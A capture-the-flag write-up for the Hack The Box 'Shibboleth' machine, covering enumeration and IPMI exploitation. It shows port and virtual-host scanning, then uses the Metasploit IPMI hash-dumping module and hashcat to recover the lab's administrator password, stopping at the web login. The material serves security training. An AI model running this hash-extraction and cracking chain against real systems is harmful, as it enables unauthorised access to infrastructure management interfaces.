# Shibboleth WriteUp - Author As3di0

Exploiting Zabbix 5.0 and mysql.



## Enumeration

First of all we need to `ping` the machine to see if it's alive.
```
root@as3diosMachine:~# ping -c 1 10.129.99.35
PING 10.129.99.35 (10.129.99.35) 56(84) bytes of data.
64 bytes from 10.129.99.35: icmp_seq=1 ttl=63 time=38.8 ms

--- 10.129.99.35 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.839/38.839/38.839/0.000 ms
root@as3diosMachine:~# 

```


Now we are going to search for open ports in the server with `Nmap`.

```
root@as3diosMachine:~/Desktop/HTB/Labs/Shibboleth# nmap -sCV -p80 10.129.99.35 -oN nmap/targeted
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-14 23:42 GMT
Nmap scan report for 10.129.99.35
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://shibboleth.htb/
Service Info: Host: shibboleth.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds
```


So we have a web server, running `Apache 2.4.41`, and we have a dns to add to the `/etc/hosts`.

In this moment before running the browser to check the web, I'm starting to enumerate directories and possible virtual hosts in
this machine, so we are going to use `wfuzz` and `gobuster` to do this :


>            |------| Gobuster Directory Search |------|

```

root@as3diosMachine:~/Desktop/HTB/Labs/Shibboleth# gobuster dir -u http://shibboleth.htb/ -w /usr/share/wordlists/dirbuster/directory-list-
2.3-medium.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shibboleth.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/11/14 23:47:28 Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 317] [--> http://shibboleth.htb/assets/]
/forms                (Status: 301) [Size: 316] [--> http://shibboleth.htb/forms/] 
Progress: 3525 / 220561 (1.60%)                                                   ^C
[!] Keyboard interrupt detected, terminating.
                                                                                   
===============================================================
2021/11/14 23:47:45 Finished
===============================================================
```

We have found `/assets` and `/forms`, which is going to give us nothing but headaches. But good to try and see errors, even a possible Directory Transversal,
which I have been inable to exploit. But the deal comes here:


>            |------| Wfuzz Virtual Host Discovery |------|


```
root@as3diosMachine:~/Desktop/HTB/Labs/Shibboleth# gobuster vhost -u http://shibboleth.htb/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt | grep -v "Status: 302"
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://shibboleth.htb/
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/11/15 00:19:02 Starting gobuster in VHOST enumeration mode
===============================================================
Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]    
Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]      
Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]           
Progress: 2183 / 4990 (43.75%)                                

```

So we have another 3 hosts to add to `/etc/hosts`, and then check what they are, now we can start enumerating all of the webs.

Now we are goig to find nothing in `http://shibboleth.htb/` and in the other 3 we are going to find the same login pannel.

>**UDP** Enumeration

So what I thought is, what if, it has some udp port open, only port 80 open is mostly wierd in medium machines, so we 
use again `Nmap` and try to see if there are some opened ones.

```
root@as3diosMachine:~/Desktop/HTB/Labs/Shibboleth# nmap -sU -T5 10.129.99.35 -oN nmap/udp 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-15 00:38 GMT
Warning: 10.129.99.35 giving up on port because retransmission cap hit (2).
Nmap scan report for shibboleth.htb (10.129.99.35)
Host is up (0.038s latency).
Not shown: 856 open|filtered ports, 143 closed ports
PORT    STATE SERVICE
623/udp open  asf-rmcp

Nmap done: 1 IP address (1 host up) scanned in 137.98 seconds

```

Now if we search for this in internet we'll find IPMI v2 Password Hash Disclosure.

And if we search for public exploits, we'll find a metasploit module that will capture an administrator's hash, to crack it
afterwards, and gain access to the pannel.

> MSF Console Exploit

```
root@as3diosMachine:~/Desktop/HTB/Labs/Shibboleth# msfconsole


      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
  lOOOOOOOO.         ;d;         ,OOOOOOOOl
  .OOOOOOOO.   .;           ;    ,OOOOOOOO.
   cOOOOOOO.   .OOc.     'oOO.   ,OOOOOOOc
    oOOOOOO.   .OOOO.   :OOOO.   ,OOOOOOo
     lOOOOO.   .OOOO.   :OOOO.   ,OOOOOl
      ;OOOO'   .OOOO.   :OOOO.   ;OOOO;
       .dOOo   .OOOOocccxOOOO.   xOOd.
         ,kOl  .OOOOOOOOOOOOO. .dOk,
           :kk;.OOOOOOOOOOOOO.cOk:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.1.4-dev                           ]
+ -- --=[ 2162 exploits - 1147 auxiliary - 367 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Search can apply complex filters such as 
search cve:2009 type:exploit, see all the filters 
with help search

msf6 > search ipmi

Matching Modules
================

   #  Name                                                    Disclosure Date  Rank    Check  Description
   -  ----                                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ipmi/ipmi_cipher_zero                 2013-06-20       normal  No     IPMI 2.0 Cipher Zero Authentication Bypass Scanner
   1  auxiliary/scanner/ipmi/ipmi_dumphashes                  2013-06-20       normal  No     IPMI 2.0 RAKP Remote SHA1 Password Hash Retrieval
   2  auxiliary/scanner/ipmi/ipmi_version                                      normal  No     IPMI Information Discovery
   3  exploit/multi/upnp/libupnp_ssdp_overflow                2013-01-29       normal  No     Portable UPnP SDK unique_service_name() Remote Code Execution
   4  auxiliary/scanner/http/smt_ipmi_cgi_scanner             2013-11-06       normal  No     Supermicro Onboard IPMI CGI Vulnerability Scanner
   5  auxiliary/scanner/http/smt_ipmi_49152_exposure          2014-06-19       normal  No     Supermicro Onboard IPMI Port 49152 Sensitive File Exposure
   6  auxiliary/scanner/http/smt_ipmi_static_cert_scanner     2013-11-06       normal  No     Supermicro Onboard IPMI Static SSL Certificate Scanner
   7  exploit/linux/http/smt_ipmi_close_window_bof            2013-11-06       good    Yes    Supermicro Onboard IPMI close_window.cgi Buffer Overflow
   8  auxiliary/scanner/http/smt_ipmi_url_redirect_traversal  2013-11-06       normal  No     Supermicro Onboard IPMI url_redirect.cgi Authenticated Directory Traversal


Interact with a module by name or index. For example info 8, use 8 or use auxiliary/scanner/http/smt_ipmi_url_redirect_traversal

msf6 > use 1
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_HASHCAT_FILE yes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.99.35
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.129.99.35:623 - IPMI - Hash found: Administrator:cf92d5738201000018674f97e3593d93040485ea5b4605017f29b7a15001d78f16eda40c177dde0ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:8516543ef58ff17ff7b7c33bafc3e6c58e48681b
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

So now we have a user Administrator ; and a password hash in SHA1 format in a file to pass it to john, but first we need to erase the IP
Address from the hash, and also the Administrator: part.

What's left in "yes" file:

```
root@as3diosMachine:~/Desktop/HTB/Labs/Shibboleth# cat yes 
$rakp$cf92d5738201000018674f97e3593d93040485ea5b4605017f29b7a15001d78f16eda40c177dde0ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$8516543ef58ff17ff7b7c33bafc3e6c58e48681b
root@as3diosMachine:~/Desktop/HTB/Labs/Shibboleth# 

```

So now we can crack it with HashCat:

> Cracking SHA1 Hash with HashCat

```
root@as3diosMachine:~/Desktop/HTB/Labs/Shibboleth# hashcat -m 7300 -a 0 hashcat /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-4870HQ CPU @ 2.50GHz, 6544/6608 MB (2048 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

77b13fd3820b0000a957d600af54723023f36c1d77be8580cd8c3063afe9c3ef7d55c34769c12e77a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:8cc4c495eb33469378dd8f55d5b7384b8aac0e05:ilovepumkinpie1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: IPMI2 RAKP HMAC-SHA1
Hash.Target......: 77b13fd3820b0000a957d600af54723023f36c1d77be8580cd8...ac0e05
Time.Started.....: Mon Nov 15 01:08:57 2021 (4 secs)
Time.Estimated...: Mon Nov 15 01:09:01 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2080.7 kH/s (0.70ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7395328/14344385 (51.56%)
Rejected.........: 0/7395328 (0.00%)
Restore.Point....: 7393280/14344385 (51.54%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: iloverobert!!! -> ilovepaul0

Started: Mon Nov 15 01:08:39 2021
Stopped: Mon Nov 15 01:09:02 2021

```
So we have now credentials for the web : 

** Administrator : ilovepumkinpie1 **

## FootHold

> Log in the web server

For this we are going to try and log in to that account in all the three login pannels we have.

Trying this we find out that only monitor.shibboleth.htb allow us to log in as Administrator.

So we log in, and start to see what functionalities we could exploit.


